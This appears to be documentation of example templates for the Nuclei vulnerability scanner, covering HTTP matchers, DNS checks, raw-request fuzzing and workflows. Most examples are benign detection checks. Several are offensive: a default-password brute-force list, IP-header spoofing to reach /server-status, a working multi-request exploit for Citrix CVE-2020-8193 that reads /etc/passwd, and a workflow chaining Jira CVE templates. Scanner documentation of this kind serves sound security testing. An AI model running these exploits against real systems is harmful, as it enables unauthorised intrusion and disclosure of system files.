# Template Examples

## HTTP

### Basic Template

```yaml
id: basic-example

info:
  name: Test HTTP Template
  author: pdteam
  severity: info

requests:
  - method: GET
    path:
      - {{BaseURL}}/
    matchers:
      - type: word
        words:
          - "This is test matcher text"
```

### Multiple matchers

```yaml
id: http-multiple-matchers

info:
  name: Test HTTP Template
  author: pdteam
  severity: info

requests:
  - method: GET
    path:
      - {{BaseURL}}/
    matchers:
      - type: word
        name: php
        words:
          - "X-Powered-By: PHP"
          - "PHPSESSID"
        part: header

      - type: word
        name: node
        words:
          - "Server: NodeJS"
          - "X-Powered-By: nodejs"
        condition: or
        part: header

      - type: word
        name: python
        words:
          - "Python/2."
          - "Python/3."
        part: header
```

### Matchers with conditions

```yaml
id: matchers-conditions

info:
  name: Test HTTP Template
  author: pdteam
  severity: info

requests:
  - method: GET
    path:
      - {{BaseURL}}/

    matchers:
      - type: word
        words:
          - "X-Powered-By: PHP"
          - "PHPSESSID"
        condition: and
        part: header

      - type: word
        words:
          - "PHP"
        part: body
```

### Multiple matcher conditions

```yaml
id: multiple-matchers-conditions

info:
  name: Test HTTP Template
  author: pdteam
  severity: info

requests:
  - method: GET
    path:
      - {{BaseURL}}/

    matchers-condition: and
    matchers:

      - type: word
        words:
          - "X-Powered-By: PHP"
          - "PHPSESSID"
        condition: or
        part: header

      - type: word
        words:
          - PHP
        part: body
```

### Custom headers

```yaml
id: custom-headers

info:
  name: Test HTTP Template
  author: pdteam
  severity: info

requests:
  - method: GET

    # Example of sending some headers to the servers

    headers:

      X-Client-IP: 127.0.0.1
      X-Remote-IP: 127.0.0.1
      X-Remote-Addr: 127.0.0.1
      X-Forwarded-For: 127.0.0.1
      X-Originating-IP: 127.0.0.1

    path:
      - {{BaseURL}}/server-status

    matchers:
      - type: word
        words:
          - Apache Server Status
          - Server Version
        condition: and
```

### POST requests

```yaml
id: post-request

info:
  name: Test HTTP Template
  author: pdteam
  severity: info

requests:
  - method: POST
    path:
      - {{BaseURL}}/graphql

    body: '{"query":"query IntrospectionQuery{__schema {queryType { name }}}"}'

    matchers:
      - type: word
        words:
          - '{"data":{"__schema":{"queryType":'
```

## DNS  

### Basic template

```yaml
id: basic-dns-example

info:
  name: Test DNS Template
  author: pdteam
  severity: info

dns:
  - name: "{{FQDN}}"
    type: CNAME
    class: inet
    recursion: true
    retries: 3
    matchers:
      - type: word
        words:
          # The response must contains a CNAME record
          - "IN\tCNAME"
```

### Multiple matcher

```yaml
id: multiple-matcher

info:
  name: Test DNS Template
  author: pdteam
  severity: info

dns:
  - name: "{{FQDN}}"
    type: CNAME
    class: inet
    recursion: true
    retries: 5
    matchers-condition: or
    matchers:
      - type: word
        name: zendesk
        words:
          - "zendesk.com"
      - type: word
        name: github
        words:
          - "github.io"
```

## RAW Request & Fuzzing 

### Basic template

```yaml
id: basic-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9

    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```

### Multiple RAW request

```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9

      - |
        POST /testing HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9

        testing=parameter

    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```

### HTTP Intruder fuzzing

```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

requests:

# HTTP Intruder fuzzing with in template payload support. 

  - payloads:
      username: 
      - admin

      password: 
      - admin
      - guest
      - password
      - test
      - 12345
      - 123456

    attack: clusterbomb

    # Available types: sniper, pitchfork and clusterbomb

    raw:
      # Request with simple param and header manipulation with DSL functions
      - |
        POST /?username={{"username"}}&paramb={{"password"}} HTTP/1.1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5)
        Host: {{Hostname}}
        another_header: {{base64("password")}}
        Accept: */*

        body=test

        # This is body

    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```

### Fuzzing multiple requests 

```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

requests:

# HTTP Intruder fuzzing wordlist based payload support. 

  - payloads:
      param_a: payloads/prams.txt
      param_b: payloads/paths.txt

    attack: clusterbomb

    # Available types: sniper, pitchfork and clusterbomb

    raw:
      # Request with simple param and header manipulation with DSL functions
      - |
        POST /?param_a={{param_a}}&paramb={{param_b}} HTTP/1.1
        User-Agent: {{param_a}}
        Host: {{Hostname}}
        another_header: {{base64(param_b)}}
        Accept: */*

        admin=test

      # Request with body with DSL helper manipulation

      - |
        DELETE / HTTP/1.1
        User-Agent: nuclei
        Host: {{Hostname}}

        {{sha256(param_a)}} 

      - |
        PUT / HTTP/1.1
        Host: {{Hostname}}

        {{html_escape(param_a)}} + {{hex_encode(param_b))}}

    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```


### Authenticated fuzzing

```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9

      - |
        POST /testing HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9

        testing=parameter

    # Cookie-reuse maintain the session between all request like browser. 

    cookie-reuse: true
    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```

### Dynamic variable support


```yaml
id: CVE-2020-8193
info:
  name: Citrix unauthenticated LFI
  author: pdteam
  severity: high
  # Source:- https://github.com/jas502n/CVE-2020-8193
requests:
  - raw:
      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        Content-Type: application/xml
        X-NITRO-USER: xpyZxwy6
        X-NITRO-PASS: xWXHUJ56

        <appfwprofile><login></login></appfwprofile>
      - |
        GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
      - |
        GET /menu/neo HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
      - |
        GET /menu/stc HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oY39DXzQ
        X-NITRO-PASS: ZuU9Y9c1
        rand_key: {{rand_key}}

        <appfwprofile><login></login></appfwprofile>
      - |
        POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oY39DXzQ
        X-NITRO-PASS: ZuU9Y9c1
        rand_key: {{rand_key}}

        <clipermission></clipermission>

    cookie-reuse: true

   # Using cookie-reuse to maintain session between each request, same as browser. 

    extractors:
      - type: regex
        name: rand_key
        part: body
        regex:
          - "(?m)[0-9]{3,10}\\.[0-9]+"

        # Using rand_key as dynamic variable to make use of extractors at run time. 

    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body
```


## Worflow 

```yaml
id: workflow-example
info:
  name: Jira-Pawner
  author: mzack9999

variables:

  # defining temapltes using variables.
  # variables names as user defind, it could be anything.
  # relative path support is now added into nuclei engine for better UX.

  jira: panels/detect-jira.yaml
  jira_cve_1: cves/CVE-2018-20824.yaml
  jira_cve_2: cves/CVE-2019-3399.yaml
  jira_cve_3: cves/CVE-2019-11581.yaml
  jira_cve_4: cves/CVE-2017-18101.yaml

logic:
  |
 # defening conditionals templates.
  if jira() {

 # if above conditon retruns true, run all the below tempaltes.
 # if above conditon fails, no tempaltes will be executed.

    jira_cve_1()
    jira_cve_2()
    jira_cve_3()
    jira_cve_4()

  }
```
